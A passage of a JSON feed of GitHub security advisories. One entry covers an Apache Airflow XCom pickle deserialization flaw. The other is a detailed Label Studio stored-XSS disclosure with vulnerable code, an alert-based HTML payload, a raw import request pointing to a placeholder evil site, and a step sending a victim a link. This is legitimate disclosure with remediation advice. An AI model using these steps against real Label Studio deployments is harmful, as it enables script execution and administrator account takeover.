            "content_html": "<p>Apache Airflow, versions before 2.8.1, have a vulnerability that allows a potential attacker to poison the XCom data by bypassing the protection of \"enable_xcom_pickling=False\" configuration setting resulting in poisoned data after XCom deserialization. This vulnerability is considered low since it requires a DAG author to exploit it. Users are recommended to upgrade to version 2.8.1 or later, which fixes this issue.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-50943\">https://nvd.nist.gov/vuln/detail/CVE-2023-50943</a></li>\n<li><a href=\"https://github.com/apache/airflow/pull/36255\">https://github.com/apache/airflow/pull/36255</a></li>\n<li><a href=\"https://lists.apache.org/thread/fx278v0twqzxkcts70tc04cp3f8p56pn\">https://lists.apache.org/thread/fx278v0twqzxkcts70tc04cp3f8p56pn</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2024/01/24/4\">http://www.openwall.com/lists/oss-security/2024/01/24/4</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow/PYSEC-2024-13.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow/PYSEC-2024-13.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c3c6-f2ww-xfr2\">https://github.com/advisories/GHSA-c3c6-f2ww-xfr2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c3c6-f2ww-xfr2",
            "title": "[apache-airflow] Apache Airflow: pickle deserialization vulnerability in XComs",
            "date_modified": "2024-01-24T20:55:31.000Z",
            "date_published": "2024-01-24T15:30:30.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c3c6-f2ww-xfr2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"introduction\">Introduction</h1>\n<p>This write-up describes a vulnerability found in <a href=\"https://github.com/HumanSignal/label-studio\">Label Studio</a>, a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to <code>1.10.1</code> and was tested on version <code>1.9.2.post0</code>.</p>\n<h1 id=\"overview\">Overview</h1>\n<p><a href=\"https://github.com/HumanSignal/label-studio\">Label Studio</a> had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.</p>\n<h1 id=\"description\">Description</h1>\n<p>The following <a href=\"https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146\">code snippet in Label Studio</a> showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.</p>\n<pre><code class=\"language-python\">def tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] &lt;1&gt;\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n</code></pre>\n<ol>\n<li>The file name that was set was retrieved from the URL.</li>\n</ol>\n<p>The downloaded file path could then be retrieved by sending a request to <code>/api/projects/{project_id}/file-uploads?ids=[{download_id}]</code> where <code>{project_id}</code> was the ID of the project and <code>{download_id}</code> was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the <a href=\"https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62\">following code snippet</a> demonstrated that the <code>Content-Type</code> of the response was determined by the file extension, since <code>mimetypes.guess_type</code> guesses the <code>Content-Type</code> based on the file extension.</p>\n<pre><code class=\"language-python\">class UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} =&gt; {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) &lt;1&gt;\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n</code></pre>\n<ol>\n<li>Determines the <code>Content-Type</code> based on the extension of the uploaded file by using <code>mimetypes.guess_type</code>.</li>\n</ol>\n<p>Since the <code>Content-Type</code> was determined by the file extension of the downloaded file, an attacker could import in a <code>.html</code> file that would execute JavaScript when visited.</p>\n<h1 id=\"proof-of-concept\">Proof of Concept</h1>\n<p>Below were the steps to recreate this issue:</p>\n<ol>\n<li>Host the following HTML proof of concept (POC) script on an external website with the file extension <code>.html</code> that would be downloaded to the Label Studio website.</li>\n</ol>\n<pre><code class=\"language-html\">&lt;html&gt;\n    &lt;body&gt;\n        &lt;h1&gt;Data Import XSS&lt;/h1&gt;\n        &lt;script&gt;\n            alert(document.domain);\n        &lt;/script&gt;\n    &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n<ol start=\"2\">\n<li>Send the following <code>POST</code> request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the <code>{victim_host}</code> is the address and port of the victim Label Studio website (eg. <code>labelstudio.com:8080</code>), <code>{project_id}</code> is the ID of the project where the data would be imported into, <code>{cookies}</code> are session cookies and <code>{evil_site}</code> is the website hosting the malicious HTML file (named <code>xss.html</code> in the following example).</li>\n</ol>\n<pre><code class=\"language-http\">POST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n</code></pre>\n<ol start=\"3\">\n<li><p>To retrieve the downloaded file path could be retrieved by sending a <code>GET</code> request to <code>/api/projects/{project_id}/file-uploads?ids=[{download_id}]</code>, where <code>{download_id}</code> is the ID of the file download from the previous step.</p>\n</li>\n<li><p>Send your victim a link to <code>/data/{file_path}</code>, where <code>{file_path}</code> is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting <code>/data/upload/1/cfcfc340-xss.html</code>.</p>\n</li>\n</ol>\n<p><img alt=\"xss-import-alert\" src=\"https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png\"></p>\n<h1 id=\"impact\">Impact</h1>\n<p>Executing arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.</p>\n<h1 id=\"remediation-advice\">Remediation Advice</h1>\n<ul>\n<li>For all user provided files that are downloaded by Label Studio, set the <code>Content-Security-Policy: sandbox;</code> response header when viewed on the site. The <code>sandbox</code> directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a <code>same-origin</code> policy (<a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox\">documentation</a>).</li>\n<li>Restrict the allowed file extensions that could be downloaded.</li>\n</ul>\n<h1 id=\"discovered\">Discovered</h1>\n<ul>\n<li>August 2023, Alex Brown, elttam</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/HumanSignal/label-studio/security/advisories/GHSA-fq23-g58m-799r\">https://github.com/HumanSignal/label-studio/security/advisories/GHSA-fq23-g58m-799r</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-23633\">https://nvd.nist.gov/vuln/detail/CVE-2024-23633</a></li>\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox\">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox</a></li>\n<li><a href=\"https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62\">https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62</a></li>\n<li><a href=\"https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146\">https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fq23-g58m-799r\">https://github.com/advisories/GHSA-fq23-g58m-799r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fq23-g58m-799r",
            "title": "[label-studio] Cross-site Scripting Vulnerability on Data Import",
            "date_modified": "2024-01-24T14:21:49.000Z",
            "date_published": "2024-01-24T14:21:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fq23-g58m-799r"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}